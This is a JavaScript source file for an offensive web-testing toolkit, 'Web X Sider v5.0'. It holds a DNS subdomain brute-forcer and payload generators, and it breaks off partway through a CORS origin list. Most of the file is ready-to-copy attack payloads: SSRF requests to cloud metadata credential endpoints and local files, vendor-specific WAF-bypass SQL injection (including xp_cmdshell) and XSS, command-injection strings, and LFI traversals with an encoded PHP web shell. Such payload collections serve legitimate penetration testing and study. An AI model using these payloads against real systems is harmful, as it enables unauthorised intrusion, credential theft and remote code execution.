/* ============================================================
   Web X Sider — Advanced Security Testing Toolkit v5.0
   Features: DNS Brute-Force, SSRF Helpers, WAF Bypass,
   CORS Deep Testing, CSP Bypass, Dir Brute Improvements,
   OAuth/SAML Deep Testing, JWT Advanced Attacks, GraphQL Abuse,
   gRPC Detection, Business Logic Helpers, API Fuzzing Templates.
   ============================================================ */
(function () {
  "use strict";

  const $ = (id) => document.getElementById(id);
  const esc = (v) => (window.escapeHtml ? window.escapeHtml(v) : String(v ?? ""));
  const badge = (l, t) => (window.badge ? window.badge(l, t) : `<span class="recon-badge ${t || "info"}">${esc(l)}</span>`);
  const toast = (m, t) => (window.showToast ? window.showToast(m, t) : console.log(m));
  const download = (name, content, type) => window.downloadFile(name, content, type);
  const delay = (ms) => new Promise(r => setTimeout(r, ms));
  const concurrency = () => (window._REQUEST_CONCURRENCY || 5);

  async function fetchT(url, options) {
    return window.fetchTarget(url, options);
  }

  function buildPanel(id, html) {
    return `<div id="tk-panel-${id}" class="tk-panel" style="display:none;">${html}</div>`;
  }

  /* ============================================================
     P1-1: DNS SUBDOMAIN BRUTE-FORCE VIA DoH
     ============================================================ */
  function dnsBrutePanelHTML() {
    return buildPanel("dnsbrute", `
      <div class="dnsbrute-section">
        <h3><i class="fas fa-network-wired"></i> DNS Subdomain Brute-Force</h3>
        <p class="tool-desc">Discover subdomains using DNS-over-HTTPS resolution with wordlist brute-forcing</p>
        <div class="dnsbrute-form">
          <label>Target Domain:</label>
          <input type="text" id="dnsBruteDomain" placeholder="example.com" style="width:300px;" />
          <label>Wordlist:</label>
          <select id="dnsBruteWordlist">
            <option value="common">Common (100 subdomains)</option>
            <option value="medium">Medium (500 subdomains)</option>
            <option value="large">Large (2000 subdomains)</option>
            <option value="custom">Custom (paste below)</option>
          </select>
          <textarea id="dnsBruteCustom" rows="3" placeholder="Enter subdomains, one per line..." style="display:none;width:100%;margin-top:8px;"></textarea>
          <label>DNS Provider:</label>
          <select id="dnsBruteProvider">
            <option value="google">Google DoH</option>
            <option value="cloudflare">Cloudflare DoH</option>
          </select>
          <div style="margin-top:12px;">
            <button id="dnsBruteStart" class="btn btn-primary"><i class="fas fa-play"></i><span>Start Brute-Force</span></button>
            <button id="dnsBruteStop" class="btn btn-danger" style="display:none;"><i class="fas fa-stop"></i><span>Stop</span></button>
            <span id="dnsBruteStatus" style="margin-left:12px;color:var(--text-dim);"></span>
          </div>
        </div>
        <div id="dnsBruteResults" class="dnsbrute-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const DNS_SUBDOMAINS_COMMON = [
    "www","mail","ftp","localhost","webmail","smtp","pop","ns1","ns2","ns3","ns4",
    "cpanel","whm","webdisk","autodiscover","autoconfig","m","mobile","imap",
    "remote","blog","weblog","portal","admin","test","dev","staging","stage",
    "api","app","beta","demo","sandbox","preview","uat","qa","ci","cd",
    "git","gitlab","github","bitbucket","svn","repo","code","source","src",
    "docs","wiki","help","support","faq","kb","knowledge","forum","community",
    "cdn","static","media","assets","img","images","imgcdn","files","download",
    "downloads","upload","uploads","backup","backups","old","new","temp","tmp",
    "db","database","sql","mysql","postgres","mongo","redis","elastic","search",
    "cache","memcache","varnish","proxy","gateway","lb","load","balance",
    "vpn","gateway","fw","firewall","ids","ips","siem","log","logs","syslog",
    "monitor","grafana","kibana","prometheus","nagios","zabbix","health",
    "jenkins","ci","cd","travis","circleci","drone","teamcity","bamboo",
    "jira","confluence","slack","teams","zoom","meet","chat","msg","notify",
    "shop","store","pay","payment","checkout","cart","order","orders","billing",
    "crm","erp","hr","payroll","intranet","portal","sso","auth","login","signin",
    "register","signup","account","profile","user","users","member","members",
    "client","clients","customer","customers","partner","partners","vendor",
    "mx","mx1","mx2","mx3","imap","pop3","smtp","email","mail2","mail3",
    "ns5","ns6","ns7","ns8","dns","dns1","dns2","resolved","resolver",
    "ipv4","ipv6","v4","v6","tunnel","wireguard","openvpn","ipsec",
    "go","redirect","redir","url","link","short","tiny","bit"
  ];

  const DNS_SUBDOMAINS_MEDIUM = [
    ...DNS_SUBDOMAINS_COMMON,
    "access","accounting","ad","ads","adserver","affiliate","affiliates",
    "ag","agenda","alerts","alpha","analytics","announce","api-v2","api-v3",
    "apigateway","archive","auth2","auth0","authentic","avatar",
    "b2b","b2c","backend","banner","billing2","bitrix","blog2","board",
    "booking","box","bugs","build","builder","calendar","campaign",
    "careers","catalog","chat2","citrix","claims","class","client2",
    "cloud2","cms","collab","compare","compute","config","connect",
    "contact2","content","contracts","control","cookie","cors","cpanel2",
    "crm2","custom","dashboard2","data","database2","db2","db-admin",
    "deploy","dev2","developer","devices","directory","dl","doc","docs2",
    "domain","drive","dropbox","elearning","email2","email3","employee",
    "engine","enroll","esxi","exchange","extranet","factor","farm",
    "feedback","files2","filter","firewall2","flow","forms","forum2",
    "freepbx","ftp2","function","gateway2","git2","gitbook","given",
    "global","grant","group","groups","guest","handler","haproxy",
    "heartbeat","help2","helpdesk","hierarchy","home","home2","hook",
    "hooks","host","host2","hosting","hub","hudson","iamp","identity",
    "image2","images2","img2","index","info2","internal2","intranet2",
    "invite","ip","ipsec","issues","items","ivr","jabber","java",
    "jenkins2","jira2","joomla","json","kafka","kibana2","kiosk",
    "lab","labs","launch","ldap","legacy","lib","library","link2",
    "live","lobby","local","localhost2","log2","login2","lost",
    "m365","machine","manage2","manager","map","market","marketing",
    "media2","meet2","members2","mercury","metrics","microsoft",
    "migration","mirror","mobil","mobile2","monitor2","ms","msrpc",
    "mx2","mx3","mx4","my","mysql2","nav","net","network","new2",
    "news","newsletter","noc","notes","notify2","ns10","ns11","ns12",
    "office","office365","online","open","operator","options","oracle",
    "orders2","owa","panel","partner2","password","payments","pbx",
    "phone","photo","photos","php","phpmyadmin","plesk","plugins",
    "pma","pool","pop2","pop32","portal2","preview2","printer",
    "privacy","private","proxy2","public","publish","push","query",
    "radius","random","read","reader","real","recovery","redirect2",
    "register2","release","remote2","report","reports","research",
    "resources","rest","review","reviews","root","router","rsync",
    "s3","sales","sap","scan","scanner","schema","secure2","security",
    "select","server","server2","service","services","share","sharepoint",
    "shell","shop2","sigma","site","site2","skydrive","smb","smtp2",
    "snap","snmp","solarwinds","sophos","spam","sql2","ssh","ssl",
    "staff","stats","status","store2","stream","student","subdomain",
    "subscribe","support2","survey","sync","systems","talk","target",
    "team","teams2","tech","terms","test2","test3","testing","ticket",
    "tickets","token","tools","tracking","transfer","translate","travel",
    "trello","ts","tunnel2","update","upload2","url2","us","v1","v2",
    "v3","v4","v5","video","videos","vimeo","vip","virtual","vpn2",
    "w3","web","web2","webdisk2","webmin","webmail2","webmaster",
    "website","whm2","wiki2","win","windows","wordpress","work",
    "workspace","www2","www3","xen","xml","xmpp","your","zabbix",
    "zen","zimbra","zabbix2"
  ];

  const DNS_SUBDOMAINS_LARGE = [
    ...DNS_SUBDOMAINS_MEDIUM,
    "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
    "aa","ab","ac","ad","ae","af","ag","ah","ai","aj","ak","al","am","an","ao","ap","aq","ar","as","at","au","av","aw","ax","ay","az",
    "ba","bb","bc","bd","be","bf","bg","bh","bi","bj","bk","bl","bm","bn","bo","bp","bq","br","bs","bt","bu","bv","bw","bx","by","bz",
    "ca","cb","cc","cd","ce","cf","cg","ch","ci","cj","ck","cl","cm","cn","co","cp","cq","cr","cs","ct","cu","cv","cw","cx","cy","cz",
    "da","db","dc","dd","de","df","dg","dh","di","dj","dk","dl","dm","dn","do","dp","dq","dr","ds","dt","du","dv","dw","dx","dy","dz",
    "ea","eb","ec","ed","ee","ef","eg","eh","ei","ej","ek","el","em","en","eo","ep","eq","er","es","et","eu","ev","ew","ex","ey","ez",
    "fa","fb","fc","fd","fe","ff","fg","fh","fi","fj","fk","fl","fm","fn","fo","fp","fq","fr","fs","ft","fu","fv","fw","fx","fy","fz",
    "ga","gb","gc","gd","ge","gf","gg","gh","gi","gj","gk","gl","gm","gn","go","gp","gq","gr","gs","gt","gu","gv","gw","gx","gy","gz",
    "ha","hb","hc","hd","he","hf","hg","hh","hi","hj","hk","hl","hm","hn","ho","hp","hq","hr","hs","ht","hu","hv","hw","hx","hy","hz",
    "ia","ib","ic","id","ie","if","ig","ih","ii","ij","ik","il","im","in","io","ip","iq","ir","is","it","iu","iv","iw","ix","iy","iz",
    "ja","jb","jc","jd","je","jf","jg","jh","ji","jj","jk","jl","jm","jn","jo","jp","jq","jr","js","jt","ju","jv","jw","jx","jy","jz",
    "ka","kb","kc","kd","ke","kf","kg","kh","ki","kj","kk","kl","km","kn","ko","kp","kq","kr","ks","kt","ku","kv","kw","kx","ky","kz",
    "la","lb","lc","ld","le","lf","lg","lh","li","lj","lk","ll","lm","ln","lo","lp","lq","lr","ls","lt","lu","lv","lw","lx","ly","lz",
    "ma","mb","mc","md","me","mf","mg","mh","mi","mj","mk","ml","mm","mn","mo","mp","mq","mr","ms","mt","mu","mv","mw","mx","my","mz",
    "na","nb","nc","nd","ne","nf","ng","nh","ni","nj","nk","nl","nm","nn","no","np","nq","nr","ns","nt","nu","nv","nw","nx","ny","nz",
    "oa","ob","oc","od","oe","of","og","oh","oi","oj","ok","ol","om","on","oo","op","oq","or","os","ot","ou","ov","ow","ox","oy","oz",
    "pa","pb","pc","pd","pe","pf","pg","ph","pi","pj","pk","pl","pm","pn","po","pp","pq","pr","ps","pt","pu","pv","pw","px","py","pz",
    "qa","qb","qc","qd","qe","qf","qg","qh","qi","qj","qk","ql","qm","qn","qo","qp","qq","qr","qs","qt","qu","qv","qw","qx","qy","qz",
    "ra","rb","rc","rd","re","rf","rg","rh","ri","rj","rk","rl","rm","rn","ro","rp","rq","rr","rs","rt","ru","rv","rw","rx","ry","rz",
    "sa","sb","sc","sd","se","sf","sg","sh","si","sj","sk","sl","sm","sn","so","sp","sq","sr","ss","st","su","sv","sw","sx","sy","sz",
    "ta","tb","tc","td","te","tf","tg","th","ti","tj","tk","tl","tm","tn","to","tp","tq","tr","ts","tt","tu","tv","tw","tx","ty","tz",
    "ua","ub","uc","ud","ue","uf","ug","uh","ui","uj","uk","ul","um","un","uo","up","uq","ur","us","ut","uu","uv","uw","ux","uy","uz",
    "va","vb","vc","vd","ve","vf","vg","vh","vi","vj","vk","vl","vm","vn","vo","vp","vq","vr","vs","vt","vu","vv","vw","vx","vy","vz",
    "wa","wb","wc","wd","we","wf","wg","wh","wi","wj","wk","wl","wm","wn","wo","wp","wq","wr","ws","wt","wu","wv","ww","wx","wy","wz",
    "xa","xb","xc","xd","xe","xf","xg","xh","xi","xj","xk","xl","xm","xn","xo","xp","xq","xr","xs","xt","xu","xv","xw","xx","xy","xz",
    "ya","yb","yc","yd","ye","yf","yg","yh","yi","yj","yk","yl","ym","yn","yo","yp","yq","yr","ys","yt","yu","yv","yw","yx","yy","yz",
    "za","zb","zc","zd","ze","zf","zg","zh","zi","zj","zk","zl","zm","zn","zo","zp","zq","zr","zs","zt","zu","zv","zw","zx","zy","zz",
    "0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15",
    "webhost","webserver","fileserver","mailserver","dnsserver","appserver",
    "gateway","firewall","loadbalancer","reversproxy","vpnserver",
    "cloud","hybrid","edge","node","cluster","master","slave","primary","replica",
    "canary","blue","green","gray","grey","dark","light","big","small",
    "prod","production","preprod","preproduction","canary","nightly","daily",
    "internal","external","public","private","dmz","perimeter",
    "iot","mobile","desktop","tablet","wearable","embedded",
    "web","api","graphql","grpc","soap","xmlrpc","jsonrpc",
    "tcp","udp","http","https","ssh","ftp","sftp","ftps",
    "dns","dhcp","ntp","snmp","syslog","ldap","kerberos",
    "redis","memcached","elasticsearch","solr","kafka","rabbitmq",
    "docker","kubernetes","k8s","openshift","mesos","swarm",
    "aws","azure","gcp","alibaba","oracle","ibm",
    "s3","gcs","blob","bucket","storage","object",
    "lambda","functions","serverless","faas","paas","saas","iaas",
    "ci","cd","pipeline","build","deploy","release","rollback",
    "monitor","alert","trace","metrics","logs","dashboard",
    "test","staging","uat","qa","dev","sandbox","demo","preview",
    "admin","root","superadmin","sysadmin","devops","sre","platform",
    "help","support","docs","wiki","kb","faq","tutorial","learn",
    "blog","news","press","media","social","community","forum",
    "shop","store","pay","billing","checkout","cart","order",
    "crm","erp","hr","finance","legal","compliance","audit",
    "research","lab","innovation","hackathon","CTF","bugbounty",
    "partner","vendor","supplier","reseller","distributor",
    "customer","client","user","member","subscriber","guest"
  ];

  let dnsBruteRunning = false;

  async function dnsBruteForce() {
    const domain = $("dnsBruteDomain")?.value?.trim();
    if (!domain) { toast("Enter a domain", "error"); return; }

    const wordlistType = $("dnsBruteWordlist")?.value || "common";
    const provider = $("dnsBruteProvider")?.value || "google";
    let wordlist;

    if (wordlistType === "custom") {
      const custom = $("dnsBruteCustom")?.value?.trim();
      if (!custom) { toast("Enter custom subdomains", "error"); return; }
      wordlist = custom.split(/[\r\n]+/).map(l => l.trim()).filter(Boolean);
    } else if (wordlistType === "large") {
      wordlist = DNS_SUBDOMAINS_LARGE;
    } else if (wordlistType === "medium") {
      wordlist = DNS_SUBDOMAINS_MEDIUM;
    } else {
      wordlist = DNS_SUBDOMAINS_COMMON;
    }

    dnsBruteRunning = true;
    $("dnsBruteStart").style.display = "none";
    $("dnsBruteStop").style.display = "inline-flex";
    const resultsEl = $("dnsBruteResults");
    resultsEl.innerHTML = '<p class="loading-text">Scanning...</p>';

    const dohUrl = provider === "cloudflare"
      ? "https://cloudflare-dns.com/dns-query"
      : "https://dns.google/resolve";

    const found = [];
    const batch = 20;
    let scanned = 0;

    for (let i = 0; i < wordlist.length && dnsBruteRunning; i += batch) {
      const slice = wordlist.slice(i, i + batch);
      const promises = slice.map(async (sub) => {
        const name = `${sub}.${domain}`;
        try {
          const url = `${dohUrl}?name=${encodeURIComponent(name)}&type=A`;
          const resp = await fetch(url, { headers: { "Accept": "application/dns-json" } });
          const data = await resp.json();
          if (data.Answer && data.Answer.length > 0) {
            const ips = data.Answer.filter(a => a.type === 1).map(a => a.data);
            if (ips.length > 0) {
              found.push({ subdomain: name, ips: ips.join(", "), ttl: data.Answer[0]?.TTL || 0 });
            }
          }
        } catch {}
      });

      await Promise.all(promises);
      scanned += slice.length;
      $("dnsBruteStatus").textContent = `${scanned}/${wordlist.length} scanned — ${found.length} found`;

      if (scanned % 100 === 0) {
        resultsEl.innerHTML = found.map(f => `
          <div class="dnsbrute-result">
            <span class="dnsbrute-name">${esc(f.subdomain)}</span>
            <span class="dnsbrute-ip">${esc(f.ips)}</span>
          </div>
        `).join("");
      }
    }

    resultsEl.innerHTML = found.length === 0
      ? '<p class="dash-empty">No subdomains found</p>'
      : found.map(f => `
        <div class="dnsbrute-result">
          <span class="dnsbrute-name">${esc(f.subdomain)}</span>
          <span class="dnsbrute-ip">${esc(f.ips)}</span>
        </div>
      `).join("");

    toast(`DNS brute-force complete: ${found.length} subdomains found`, "success");
    dnsBruteRunning = false;
    $("dnsBruteStart").style.display = "inline-flex";
    $("dnsBruteStop").style.display = "none";
  }

  /* ============================================================
     P1-2: SSRF EXPLOITATION HELPERS
     ============================================================ */
  function ssrfPanelHTML() {
    return buildPanel("ssrf", `
      <div class="ssrf-section">
        <h3><i class="fas fa-server"></i> SSRF Exploitation Helpers</h3>
        <p class="tool-desc">Test for Server-Side Request Forgery with internal IPs, cloud metadata, and protocol smuggling</p>
        <div class="ssrf-form">
          <label>Target URL (with injectable parameter):</label>
          <input type="text" id="ssrfTargetUrl" placeholder="https://target.com/fetch?url=FUZZ" style="width:100%;" />
          <label>Payload Type:</label>
          <select id="ssrfPayloadType">
            <option value="internal">Internal IPs</option>
            <option value="cloud">Cloud Metadata</option>
            <option value="protocol">Protocol Smuggling</option>
            <option value="bypass">WAF Bypass</option>
            <option value="all">All Payloads</option>
          </select>
          <div style="margin-top:12px;">
            <button id="ssrfStart" class="btn btn-primary"><i class="fas fa-play"></i><span>Generate Payloads</span></button>
            <button id="ssrfCopyAll" class="btn btn-secondary"><i class="fas fa-copy"></i><span>Copy All</span></button>
          </div>
        </div>
        <div id="ssrfPayloads" class="ssrf-payloads" style="margin-top:16px;"></div>
        <div id="ssrfTestResults" class="ssrf-test-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const SSRF_PAYLOADS = {
    internal: [
      "http://127.0.0.1", "http://127.0.0.1:80", "http://127.0.0.1:443", "http://127.0.0.1:8080",
      "http://127.0.0.1:8443", "http://127.0.0.1:3000", "http://127.0.0.1:5000", "http://127.0.0.1:9090",
      "http://[::1]", "http://0.0.0.0", "http://localhost", "http://localhost:80",
      "http://10.0.0.1", "http://10.0.0.2", "http://10.1.1.1", "http://10.10.10.10",
      "http://172.16.0.1", "http://172.16.0.2", "http://172.31.255.254",
      "http://192.168.0.1", "http://192.168.1.1", "http://192.168.1.254",
      "http://169.254.169.254", "http://metadata.google.internal",
      "dict://127.0.0.1:6379/info", "gopher://127.0.0.1:6379/_INFO",
      "file:///etc/passwd", "file:///etc/hostname", "file:///proc/self/environ",
      "file:///proc/self/cmdline", "file:///proc/net/tcp"
    ],
    cloud: [
      "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://169.254.169.254/latest/meta-data/hostname", "http://169.254.169.254/latest/user-data/",
      "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://metadata.google.internal/computeMetadata/v1/project/project-id",
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      "http://169.254.169.254/metadata/v1.json",
      "http://169.254.169.254/metadata/v1/instance",
      "http://169.254.169.254/metadata/v1/instance/identity",
      "http://169.254.169.254/metadata/instance",
      "http://fd00:ec2::254/latest/meta-data/",
      "http://[fd00:ec2::254]/latest/meta-data/"
    ],
    protocol: [
      "gopher://127.0.0.1:25/", "gopher://127.0.0.1:6379/", "gopher://127.0.0.1:11211/",
      "gopher://127.0.0.1:3306/", "gopher://127.0.0.1:5432/",
      "dict://127.0.0.1:6379/", "dict://127.0.0.1:11211/",
      "tftp://127.0.0.1:69/", "ftp://127.0.0.1/",
      "smb://127.0.0.1/", "netdoc:///etc/passwd",
      "jar:http://127.0.0.1:8080/!", "netdoc://127.0.0.1/"
    ],
    bypass: [
      "http://127.1", "http://0x7f000001", "http://2130706433",
      "http://0177.0.0.1", "http://127.0.0.1.nip.io",
      "http://127.0.0.1.sslip.io", "http://localtest.me",
      "http://127.0.0.1%2523@target.com", "http://target.com@127.0.0.1",
      "http://127.0.0.1%0d%0a", "http://127.0.0.1%0A",
      "http://127.0.0.1:80\\@target.com", "http://127.0.0.1:80?@target.com",
      "http://www.target.com@127.0.0.1", "http://www.target.com%2523@127.0.0.1",
      "http://127.0.0.1:80\\t", "http://127.0.0.1:80\\r",
      "http://127.0.0.1:80\\n", "http://127.0.0.1:80%20",
      "http://127.0.0.1:80%09", "http://127.0.0.1:80%00",
      "http://127.0.0.1:80#.target.com", "http://127.0.0.1:80??.target.com",
      "http://127.0.0.1:80@target.com", "http://127.0.0.1:80\\@@target.com",
      "http://127.0.0.1:80%2523@target.com", "http://127.0.0.1:80%0d%0aHost:%20target.com"
    ]
  };

  function generateSsrfPayloads() {
    const type = $("ssrfPayloadType")?.value || "all";
    const payloads = type === "all"
      ? [...SSRF_PAYLOADS.internal, ...SSRF_PAYLOADS.cloud, ...SSRF_PAYLOADS.protocol, ...SSRF_PAYLOADS.bypass]
      : SSRF_PAYLOADS[type] || [];

    const el = $("ssrfPayloads");
    el.innerHTML = `
      <h4>${payloads.length} Payloads</h4>
      <div class="ssrf-payload-list">
        ${payloads.map((p, i) => `
          <div class="ssrf-payload-item">
            <span class="ssrf-payload-num">${i + 1}</span>
            <code class="ssrf-payload-code">${esc(p)}</code>
            <button class="ssrf-copy-btn btn btn-sm" onclick="navigator.clipboard.writeText('${esc(p)}').then(()=>window.showToast?.('Copied','success'))"><i class="fas fa-copy"></i></button>
          </div>
        `).join("")}
      </div>
    `;
  }

  /* ============================================================
     P1-3: WAF BYPASS PAYLOADS
     ============================================================ */
  function wafBypassPanelHTML() {
    return buildPanel("wafbypass", `
      <div class="wafbypass-section">
        <h3><i class="fas fa-shield-virus"></i> WAF Bypass Payloads</h3>
        <p class="tool-desc">Generate WAF bypass payloads for SQLi, XSS, CMDi with encoding and obfuscation techniques</p>
        <div class="wafbypass-form">
          <label>Payload Type:</label>
          <select id="wafPayloadType">
            <option value="sqli">SQL Injection</option>
            <option value="xss">Cross-Site Scripting</option>
            <option value="cmdi">Command Injection</option>
            <option value="lfi">Local File Inclusion</option>
            <option value="all">All Types</option>
          </select>
          <label>WAF (if known):</label>
          <select id="wafTarget">
            <option value="generic">Generic</option>
            <option value="cloudflare">Cloudflare</option>
            <option value="akamai">Akamai</option>
            <option value="aws-waf">AWS WAF</option>
            <option value="modsecurity">ModSecurity</option>
            <option value="imperva">Imperva</option>
          </select>
          <div style="margin-top:12px;">
            <button id="wafGenBtn" class="btn btn-primary"><i class="fas fa-code"></i><span>Generate Payloads</span></button>
          </div>
        </div>
        <div id="wafPayloads" class="waf-payloads" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const WAF_BYPASS_PAYLOADS = {
    sqli: {
      generic: [
        "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
        "1' ORDER BY 1--", "1' ORDER BY 10--", "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--", "1' UNION SELECT NULL,NULL,NULL--",
        "1' AND '1'='1", "1' AND '1'='2", "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' UNION SELECT 1,2,3--", "' UNION ALL SELECT 1,2,3--",
        "1' GROUP BY column_name HAVING 1=1--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1'; EXEC xp_cmdshell('whoami')--"
      ],
      cloudflare: [
        "'/*!50000OR*/'1'='1", "'/*!50000UNION*//*!50000SELECT*/1,2,3--",
        "'/*!50000OR*/'1'='1'/*!50000ORDER*//*!50000BY*/1--",
        "'/*!UNION*//*!SELECT*/1,2,3--", "'/*!50000SELECT*/NULL--",
        "1'/*!50000AND*/'1'='1", "1'/*!50000SLEEP*/(5)--",
        "'/*!50000OR*/1=1--", "'/*!OR*/'1'='1",
        "1'/*!UNION*//*!ALL*//*!SELECT*/1,2,3--"
      ],
      aws: [
        "' OR '1'='1'--", "' UNION SELECT 1,2,3--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
      ],
      modsecurity: [
        "' /*!OR*/ '1'='1", "'/**/UNION/**/SELECT/**/1,2,3--",
        "1'/*!50000UNION*//*!50000SELECT*/1,2,3--",
        "'%20OR%20'1'='1", "'%20UNION%20SELECT%201,2,3--",
        "1'%20AND%20'1'='1", "1'%20AND%20SLEEP(5)--",
        "'%20OR%201=1--"
      ],
      imperva: [
        "' OR '1'='1'--", "' UNION SELECT 1,2,3--",
        "' AND SLEEP(5)--", "1' ORDER BY 1--",
        "' WAITFOR DELAY '0:0:5'--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
      ]
    },
    xss: {
      generic: [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>", "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>", "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>", "<iframe src=javascript:alert(1)>",
        "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
        "';alert(1)//", "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)//", "<svg/onload=alert(1)>"
      ],
      cloudflare: [
        "<script>alert(1)</script>", "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert(1) )//",
        "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
        "<<script>alert(1)//<</script>", "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"
      ],
      generic_bypass: [
        "<Script>alert(1)</Script>", "<SCRIPT>alert(1)</SCRIPT>",
        "<script>alert(1)</script>", "<script>alert`1`</script>",
        "<script>alert&#40;1&#41;</script>", "<script>alert&#x28;1&#x29;</script>",
        "\"><script>alert(1)</script>", "'-alert(1)-'",
        "\"><img src=x onerror=alert(1)>", "'-alert(1)-'",
        "javascript:alert(1)", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "<iframe src=\"javascript:alert(1)\">", "<object data=\"javascript:alert(1)\">",
        "<embed src=\"javascript:alert(1)\">", "<a href=\"javascript:alert(1)\">click</a>"
      ]
    },
    cmdi: [
      ";id", "|id", "||id", "&&id", "`id`", "$(id)",
      ";cat /etc/passwd", "|cat /etc/passwd", "||cat /etc/passwd",
      ";sleep 5", "|sleep 5", "||sleep 5",
      ";ping -c 3 127.0.0.1", "|ping -c 3 127.0.0.1",
      ";whoami", "|whoami", "||whoami",
      "`id`", "$(id)", "${id}",
      ";curl http://127.0.0.1/", "|curl http://127.0.0.1/",
      ";wget http://127.0.0.1/", "|wget http://127.0.0.1/",
      ";python -c 'import os;os.system(\"id\")'",
      ";ruby -e 'exec \"id\"'",
      ";perl -e 'exec \"id\"'",
      ";php -r 'system(\"id\");'"
    ],
    lfi: [
      "../../../../etc/passwd", "../../../../etc/shadow",
      "../../../../etc/hostname", "../../../../proc/self/environ",
      "../../../../proc/self/cmdline", "../../../../proc/self/status",
      "....//....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252f..%252fetc/passwd",
      "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
      "..\\..\\..\\..\\etc\\passwd",
      "....\\\\....\\\\....\\\\....\\\\etc\\\\passwd",
      "php://filter/convert.base64-encode/resource=/etc/passwd",
      "php://input", "php://stdin",
      "expect://id", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs=",
      "/etc/passwd%00", "/etc/passwd%0a",
      "....//....//....//etc/passwd", "/etc/passwd%2500"
    ]
  };

  function generateWafPayloads() {
    const type = $("wafPayloadType")?.value || "sqli";
    const waf = $("wafTarget")?.value || "generic";
    let payloads = [];

    if (type === "all") {
      payloads = [
        ...WAF_BYPASS_PAYLOADS.sqli[waf] || WAF_BYPASS_PAYLOADS.sqli.generic,
        ...WAF_BYPASS_PAYLOADS.xss[waf] || WAF_BYPASS_PAYLOADS.xss.generic,
        ...WAF_BYPASS_PAYLOADS.cmdi,
        ...WAF_BYPASS_PAYLOADS.lfi
      ];
    } else if (type === "sqli") {
      payloads = WAF_BYPASS_PAYLOADS.sqli[waf] || WAF_BYPASS_PAYLOADS.sqli.generic;
    } else if (type === "xss") {
      payloads = WAF_BYPASS_PAYLOADS.xss[waf] || WAF_BYPASS_PAYLOADS.xss.generic;
    } else if (type === "cmdi") {
      payloads = WAF_BYPASS_PAYLOADS.cmdi;
    } else if (type === "lfi") {
      payloads = WAF_BYPASS_PAYLOADS.lfi;
    }

    $("wafPayloads").innerHTML = `
      <h4>${payloads.length} Bypass Payloads (${waf} / ${type})</h4>
      <div class="waf-payload-list">
        ${payloads.map((p, i) => `
          <div class="waf-payload-item">
            <span class="waf-payload-num">${i + 1}</span>
            <code class="waf-payload-code">${esc(p)}</code>
            <button class="btn btn-sm" onclick="navigator.clipboard.writeText(this.previousElementSibling.textContent).then(()=>window.showToast?.('Copied','success'))"><i class="fas fa-copy"></i></button>
          </div>
        `).join("")}
      </div>
    `;
  }

  /* ============================================================
     P1-4: CORS DEEP TESTING
     ============================================================ */
  function corsDeepPanelHTML() {
    return buildPanel("corsdeep", `
      <div class="corsdeep-section">
        <h3><i class="fas fa-globe"></i> CORS Deep Testing</h3>
        <p class="tool-desc">Comprehensive CORS misconfiguration testing with origin reflection, preflight, and bypass techniques</p>
        <div class="corsdeep-form">
          <label>Target URL:</label>
          <input type="text" id="corsDeepUrl" placeholder="https://target.com/api/data" style="width:100%;" />
          <div style="margin-top:12px;">
            <button id="corsDeepStart" class="btn btn-primary"><i class="fas fa-play"></i><span>Test CORS</span></button>
          </div>
        </div>
        <div id="corsDeepResults" class="corsdeep-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const CORS_ORIGINS = [
    { origin: "https://evil.com", desc: "Arbitrary origin" },
    { origin: "https://target.com.evil.com", desc: "Subdomain of target on evil" },
    { origin: "https://evil-target.com", desc: "Target name on evil domain" },
    { origin: "null", desc: "Null origin (sandboxed iframe)" },
    { origin: "https://target.com", desc: "Target's own origin" },
    { origin: "http://target.com", desc: "HTTP version of target" },
    { origin: "https://subdomain.target.com", desc: "Subdomain of target" },
    { origin: "https://evil.com%2F%2Ftarget.com", desc: "URL-encoded separator" },
    { origin: "https://target.com%60.evil.com", desc: "Backtick bypass" },
    { origin: "https://target.com%0d%0a.evil.com", desc: "CRLF injection" },
    { origin: "https://target.com\\.evil.com", desc: "Backslash bypass" },
    { origin: "https://evil.com#target.com", desc: "Fragment bypass" },
